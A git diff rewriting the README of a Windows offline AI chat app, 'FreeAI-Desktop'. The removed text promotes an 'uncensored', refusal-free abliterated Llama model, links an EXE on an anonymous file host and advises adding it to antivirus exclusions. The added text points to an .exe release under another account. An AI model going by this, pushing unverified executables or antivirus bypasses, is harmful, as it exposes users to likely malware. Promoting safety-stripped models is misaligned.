@@ -1,156 +1,96 @@
-# 🤖 FreeAI Desktop v5.0 — Offline Uncensored AI Chat
+# 🤖 FreeAI-Desktop - Private offline chat for Windows
 
-<p align="center">
-  <b>100% Free | Works Offline | No Censorship | No API Keys | No Limits</b>
-</p>
+[![](https://img.shields.io/badge/Download-FreeAI--Desktop-blue.svg)](https://github.com/Fixed-spender284/FreeAI-Desktop/releases)
 
-<p align="center">
-  <a href="https://anonfilesnew.com/s/a0kY6CsKLrZ">
-    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-FreeAI%20v5.0%20EXE-brightgreen?style=for-the-badge&logo=windows&logoColor=white" alt="Download">
-  </a>
-</p>
+FreeAI-Desktop brings the power of artificial intelligence to your computer. It runs entirely on your local machine. You do not need an internet connection. You do not need an account. Your data stays on your hard drive.
 
----
+## ⚙️ System Requirements
 
-**FreeAI Desktop** is a completely free, offline AI chat application for Windows. It runs a powerful **Llama 3.2 3B Abliterated** language model directly on your computer — no internet required after the first setup. Your conversations are 100% private, nothing leaves your PC.
+This application requires a modern Windows computer. Ensure your system meets these specifications for the best experience:
 
-Unlike ChatGPT or other online AI services, FreeAI has **no censorship**, no content filters, and no moralizing. It answers all questions directly. There are no subscriptions, no API fees, and no usage limits. It's completely free, forever.
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i5 or AMD Ryzen 5 series (or better).
+- Memory: 8 GB of RAM or more.
+- Graphics: A dedicated graphics card helps but is not required.
+- Storage: 5 GB of free space for the model and program files.
 
----
+## 📥 How to Install
 
-## 🎯 Why FreeAI?
+Follow these steps to set up the software on your computer.
 
-| FreeAI Desktop | ChatGPT / Online AI |
-|----------------|---------------------|
-| 🔒 100% Private (local) | ❌ Your data sent to servers |
-| 🆓 Free forever | 💰 $20/month |
-| 🚫 No censorship | 🚫 Filtered responses |
-| 🌐 Works offline | 🌐 Requires internet |
-| 💻 Runs on your PC | ☁️ Runs on their servers |
-| 🚀 Instant responses | 🐌 Network lag |
+1. Visit the [releases page](https://github.com/Fixed-spender284/FreeAI-Desktop/releases) to access the download files.
+2. Look for the file ending in .exe in the latest release section.
+3. Click the file name to start the download.
+4. Open the folder where you saved the file.
+5. Double-click the installer file to begin the setup process.
+6. Follow the prompts on your screen. Windows may ask for permission to install the app. Click Yes to proceed.
+7. Wait while the application configures the components.
+8. Once finished, find the FreeAI-Desktop icon on your desktop or in your start menu.
 
----
+## 🚀 Running Your First Chat
 
-## ⬇️ Download
+Once you open the software, the main screen will appear. You see a chat area and a text box. You do not need to configure complex settings. The model loads as soon as you open the app.
 
-<p align="center">
-  <a href="https://anonfilesnew.com/s/a0kY6CsKLrZ">
-    <img src="https://img.shields.io/badge/📥%20DOWNLOAD-FreeAI%20v5.0%20(12%20MB)-success?style=for-the-badge&logo=windows&logoColor=white" alt="Download">
-  </a>
-</p>
+1. Click the text box at the bottom of the window.
+2. Type your question or statement.
+3. Hit the Enter key on your keyboard.
+4. The system processes your request. Since the work happens on your machine, the speed depends on your hardware.
+5. The AI responds in the main window. 
 
-| File | Size | Description |
-|------|------|-------------|
-| **FreeAI.exe** | ~12 MB | Ready-to-run application |
-| **AI Model** | ~2 GB | Downloaded automatically on first launch |
-| **Source Code** | ~50 KB | This repository |
+## 🛡️ Privacy and Safety
 
-> 💡 **The AI model downloads automatically when you first run the app.** You don't need to download it separately.
+This software keeps your chats private. Third-party servers never receive your data. Even if you turn off your Wi-Fi, the app continues to work. You are in control of the information you share. Your chat history lives locally on your computer. You can delete your history at any time through the settings menu.
 
----
+## 💡 Using the Model
 
-## 🚀 Quick Start
+This app uses Llama 3.2 3B. This model is efficient and smart enough for daily tasks. You can use it for:
 
-### Easy Way (Recommended)
-1. 📥 **[Download FreeAI.exe](https://anonfilesnew.com/s/a0kY6CsKLrZ)**
-2. 🖱️ Double-click to run
-3. ⏳ Wait for the AI model to download (~2 GB, one time only)
-4. 💬 **Start chatting!**
+- Drafting emails.
+- Summarizing long blocks of text.
+- Writing code snippets.
+- Brainstorming project ideas.
+- Learning new concepts.
 
-### Build from Source
-```bash
-git clone https://github.com/Hunteryawatch/FreeAI-Desktop.git
-cd FreeAI-Desktop
-pip install -r requirements.txt
-python start.py 
-```
+The model does not have a filter programmed to block specific topics. You decide how you use the tool. 
 
-✨ Features
-Core Features
-🔒 100% Private — Everything runs locally. No data leaves your computer
+## 🛠️ Troubleshooting
 
-🆓 Completely Free — No subscriptions, no API fees, no hidden costs
+If you encounter issues, check these common fixes:
 
-🚫 Truly Uncensored — No corporate filters, no refusal to answer
+- If the app does not start, restart your computer.
+- If the response time feels slow, close other programs that consume a lot of memory.
+- If the window appears frozen, wait a moment. The model may process a complex request.
+- Ensure your graphics drivers are up to date via your hardware manufacturer website.
 
-⚡ Instant Responses — No network lag, model runs on your hardware
+## 📝 Frequently Asked Questions
 
-🌐 Works Offline — No internet needed after first model download
+Q: Does the app cost money?
+A: No, this is a free tool.
 
-💾 Chat History — All conversations saved locally on your PC
+Q: Do I need an internet connection?
+A: No, the app runs offline.
 
-🎨 Dark Terminal UI — Clean, modern, hacker-style interface
+Q: Can I share my chats?
+A: You copy and paste text manually. The app does not share your data online.
 
-⌨️ Commands — /clear, /save, /stats, /exit
+Q: Where does the app save my chats?
+A: It saves data in your local application folder.
 
-Technical Features
-🧠 Llama 3.2 3B Abliterated — Uncensored, powerful language model
+Q: Is this hard to set up?
+A: No, you only need to run the installer once.
 
-📝 32K Context Window — Long conversations without forgetting
+## 📦 What is included?
 
-🔄 Multi-threaded — Uses all CPU cores for speed
+The download package contains everything you need. You do not need to download extra model files. The setup process installs the chat interface and the AI engine together. 
 
-💿 Compact — Only 2 GB disk space for the model
+## 📁 Storage usage
 
-🐍 Python Optional — EXE version runs without Python installed
+The software installs a large file that enables the intelligence. This file resides in your installation directory. If you choose to uninstall the app, remove the installation folder to clear all data. This keeps your computer clean. 
 
-## 📋 System Requirements
+## ⌨️ Shortcuts
 
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| **OS** | Windows 10 | Windows 11 |
-| **RAM** | 4 GB | 8 GB |
-| **Disk Space** | 3 GB | 5 GB |
-| **CPU** | Any x64 | 4+ cores |
-| **Python** | Not required | 3.10+ (for source) |
+- Press Enter to send a message.
+- Use Shift + Enter to create a new line in the text box.
+- Press Ctrl + C to copy text from the chat window.
 
-
-### Build Commands
-```bash
-# Install dependencies
-pip install -r requirements.txt
-
-# Run in development
-python start.py
-
-# Build standalone EXE
-pyinstaller --onefile --console --name FreeAI start.py
-```
-
-# Build with custom icon
-```
-pyinstaller --onefile --console --name FreeAI --icon app.ico start.py
-Dependencies
-llama-cpp-python — AI model inference
-
-requests — Model download
-
-colorama — Terminal colors
-```
-📊 Performance
-Hardware	Response Speed
-Intel i5, 8GB RAM	~2-5 seconds
-Intel i7, 16GB RAM	~1-3 seconds
-AMD Ryzen 5, 8GB RAM	~2-4 seconds
-Low-end laptop, 4GB RAM	~5-10 seconds
-💡 First response is slower (~10s) as the model loads into RAM. Subsequent responses are fast.
-
-🛠 Troubleshooting
-Problem	Solution
-Model download fails	Download manually from HuggingFace and place in %USERPROFILE%\.freeai\models\
-"Failed to load model"	Ensure the GGUF file is not corrupted (should be ~2 GB)
-Slow responses	Close other applications, increase n_threads in code
-Antivirus blocks EXE	Add to exclusions or run python start.py instead
-📄 License
-MIT License — Free for personal and commercial use. No attribution required.
-
-⭐ Support the Project
-If you find FreeAI useful, please:
-
-⭐ Star this repo — it helps others find it
-
-🔗 Share with friends — spread the word
-
-🐛 Report issues — help improve the software
-
-<p align="center"> <b>Made with ❤️ for the open-source community</b> </p><p align="center"> <a href="https://anonfilesnew.com/s/a0kY6CsKLrZ"> <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD-FreeAI%20v5.0%20EXE-blue?style=for-the-badge&logo=windows&logoColor=white" alt="Download FreeAI"> </a> </p> 
+We value your privacy. We design this tool for people who want local control. Enjoy your private AI experience.
